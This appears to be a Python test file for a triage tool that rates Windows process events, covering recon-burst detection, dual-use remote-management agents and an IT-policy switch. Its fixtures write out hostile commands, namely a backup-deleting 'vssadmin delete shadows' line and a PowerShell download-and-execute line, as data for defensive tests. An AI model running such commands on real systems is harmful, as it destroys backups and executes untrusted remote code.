"""The verdict, the recon burst and the dual-use gate: normal IT activity must not be Malicious,
and real attacks still are. Every name here is made up (agent.exe, PC01, analyst, example domains)."""

from tests.fixtures.events import USER, attack_events, benign_events, event
from tests.helpers import SYS, PS, checks_fired, strengths
from triage.checks import make_verdict, run_checks

AGENT = "C:\\Program Files\\Example RMM\\agent.exe"


def recon_from(launcher, middle=("cmd.exe",)):
    """launcher -> each shell in middle -> whoami + ipconfig, 1 second apart."""
    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{l}", Image=launcher,
                    ParentProcessGuid="{root}", ParentImage="C:\\Windows\\explorer.exe")]
    parent_guid, parent_image = "{l}", launcher
    for n, shell in enumerate(middle, start=2):
        guid = "{s%d}" % n
        events.append(event(n, 1, "2026-02-01 09:00:00.500", ProcessGuid=guid, Image=SYS + shell,
                            ParentProcessGuid=parent_guid, ParentImage=parent_image))
        parent_guid, parent_image = guid, SYS + shell
    for n, tool in enumerate(["whoami.exe", "ipconfig.exe"], start=10):
        events.append(event(n, 1, f"2026-02-01 09:00:0{n - 9}.000", ProcessGuid="{t%d}" % n,
                            Image=SYS + tool, ParentProcessGuid=parent_guid, ParentImage=parent_image))
    return events


# ---------- verdict ----------

def test_benign_activity_has_no_findings():
    findings = run_checks(benign_events())
    assert findings == []
    assert make_verdict(findings)["label"] == "Benign"


def test_attack_is_malicious_with_the_expected_findings():
    findings = run_checks(attack_events())
    fired = {f["check"] for f in findings}
    assert {"persistence", "recon_burst", "lookalike_domain", "suspicious_powershell",
            "document_app_spawns_program", "masquerading", "ransom_note",
            "run_from_user_folder", "network_from_user_folder"} <= fired
    assert make_verdict(findings)["label"] == "Malicious"


def test_every_finding_points_to_real_events():
    events = attack_events()
    ids = {e["record_id"] for e in events}
    for f in run_checks(events):
        assert f["event_ids"], f
        assert set(f["event_ids"]) <= ids


def test_only_low_findings_never_make_malicious():
    weak = [{"strength": "Weak", "title": f"signal {n}"} for n in range(6)]
    assert make_verdict(weak)["label"] == "Suspicious"


def test_enrichment_can_raise_suspicious_to_malicious():
    weak_only = [{"strength": "Weak", "title": "x"}]
    assert make_verdict(weak_only)["label"] == "Suspicious"
    assert make_verdict(weak_only, ["malicious"])["label"] == "Malicious"


def test_a_normal_it_day_is_not_malicious():
    from tests.fixtures.events import it_day_events
    findings = run_checks(it_day_events())
    assert make_verdict(findings)["label"] != "Malicious"
    assert findings == []   # in fact nothing in it needs a look


# ---------- recon burst ----------

def test_person_typing_whoami_and_ipconfig_is_not_a_recon_burst():
    # benign_events() has whoami + ipconfig in a cmd window opened from explorer.exe
    assert "recon_burst" not in checks_fired(benign_events())


def test_recon_typed_in_a_remote_admin_session_is_not_a_burst():
    def recon(launcher):
        return [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{l}", Image=launcher),
                event(2, 1, "2026-01-05 09:00:01.000", ProcessGuid="{w}", ParentProcessGuid="{l}",
                      Image="C:\\Windows\\System32\\whoami.exe", ParentImage=launcher),
                event(3, 1, "2026-01-05 09:00:02.000", ProcessGuid="{n}", ParentProcessGuid="{l}",
                      Image="C:\\Windows\\System32\\net.exe", ParentImage=launcher)]
    assert "recon_burst" not in checks_fired(recon("C:\\Windows\\System32\\wsmprovhost.exe"))
    assert [f["strength"] for f in run_checks(recon("C:\\Windows\\System32\\rundll32.exe"))
            if f["check"] == "recon_burst"] == ["Strong"]


def test_recon_typed_in_windows_terminal_is_not_a_burst():
    terminal = USER + "\\AppData\\Local\\Microsoft\\WindowsApps\\WindowsTerminal.exe"
    assert "recon_burst" not in checks_fired(recon_from(terminal, middle=("powershell.exe",)))


def test_recon_from_a_shell_opened_before_the_log_is_not_a_burst():
    # Only the two tools are in the log; the cmd.exe window that ran them started earlier.
    tools_only = [e for e in recon_from(AGENT) if e["record_id"] >= 10]
    assert "recon_burst" not in checks_fired(tools_only)


def test_recon_by_a_downloaded_program_stays_malicious():
    events = recon_from(USER + "\\Downloads\\setup.exe")
    assert strengths(events, "recon_burst") == ["Strong"]
    assert make_verdict(run_checks(events))["label"] == "Malicious"


# ---------- dual-use gate and the IT switch ----------

def test_rmm_tool_plus_recon_alone_is_suspicious_not_malicious():
    # The acceptance test: a signed remote-management agent runs recon through two shells.
    events = recon_from(AGENT, middle=("cmd.exe", "powershell.exe"))
    findings = run_checks(events)
    recon = [f for f in findings if f["check"] == "recon_burst"]
    assert recon[0]["process"] == AGENT              # walked up past both shells
    assert recon[0]["strength"] == "Weak" and "dual-use" in recon[0]["detail"]
    assert make_verdict(findings)["label"] == "Suspicious"


def test_dual_use_finding_backed_by_a_high_finding_stays_strong():
    # The same agent also deletes the backups (no legitimate use): now the recon is High too.
    events = recon_from(AGENT) + [
        event(20, 1, "2026-02-01 09:00:05.000", ProcessGuid="{v}", ParentProcessGuid="{l}",
              Image=SYS + "vssadmin.exe", ParentImage=AGENT, CommandLine="vssadmin delete shadows /all /quiet")]
    assert strengths(events, "recon_burst") == ["Strong"]


def test_two_different_dual_use_findings_in_one_chain_are_malicious():
    # Recon + download-and-run by the same agent: two attack steps in one chain (gate rule 4).
    events = recon_from(AGENT) + [
        event(20, 1, "2026-02-01 09:00:05.000", ProcessGuid="{p}", ParentProcessGuid="{l}", Image=PS,
              ParentImage=AGENT, CommandLine="powershell -c iex (iwr https://scripts.example.com/a.ps1)")]
    assert make_verdict(run_checks(events))["label"] == "Malicious"


def test_two_findings_of_the_same_dual_use_kind_stay_low():
    # Two recon bursts by the same agent are still one kind of action: Low.
    later = [dict(e, record_id=e["record_id"] + 100, time=e["time"].replace("09:00", "11:00"))
             for e in recon_from(AGENT)[1:]]
    findings = run_checks(recon_from(AGENT) + later)
    assert {f["strength"] for f in findings if f["check"] == "recon_burst"} == {"Weak"}


def user_installed_rmm_recon():
    """A user runs a remote-support setup from Downloads; it writes the agent into Program Files;
    the agent (started by a service) runs whoami + ipconfig. Nothing else happens."""
    setup = USER + "\\Downloads\\RemoteSupport.ClientSetup.exe"
    return [event(1, 1, "2026-02-01 08:59:00.000", ProcessGuid="{setup}", Image=setup,
                  ParentProcessGuid="{explorer}", ParentImage="C:\\Windows\\explorer.exe"),
            event(2, 11, "2026-02-01 08:59:05.000", ProcessGuid="{setup}", Image=setup,
                  TargetFilename=AGENT)] + recon_from(AGENT)[1:]   # the agent's own start is not needed


def test_user_installed_rmm_recon_depends_on_the_it_setting():
    # Off (default): users install their own software, so the Downloads setup is normal: Low.
    findings = run_checks(user_installed_rmm_recon())
    assert [f["strength"] for f in findings if f["check"] == "recon_burst"] == ["Weak"]
    assert make_verdict(findings)["label"] == "Suspicious"
    # On: IT installs all software here, so a user-installed agent is a warning sign: High.
    findings = run_checks(user_installed_rmm_recon(), it_installs_all=True)
    assert [f["strength"] for f in findings if f["check"] == "recon_burst"] == ["Strong"]
    assert make_verdict(findings)["label"] == "Malicious"


def test_it_setting_does_not_change_an_rmm_tool_installed_by_it():
    # No setup program in a user folder: Low with the switch on or off.
    for it_installs_all in (False, True):
        findings = run_checks(recon_from(AGENT), it_installs_all=it_installs_all)
        assert make_verdict(findings)["label"] == "Suspicious"
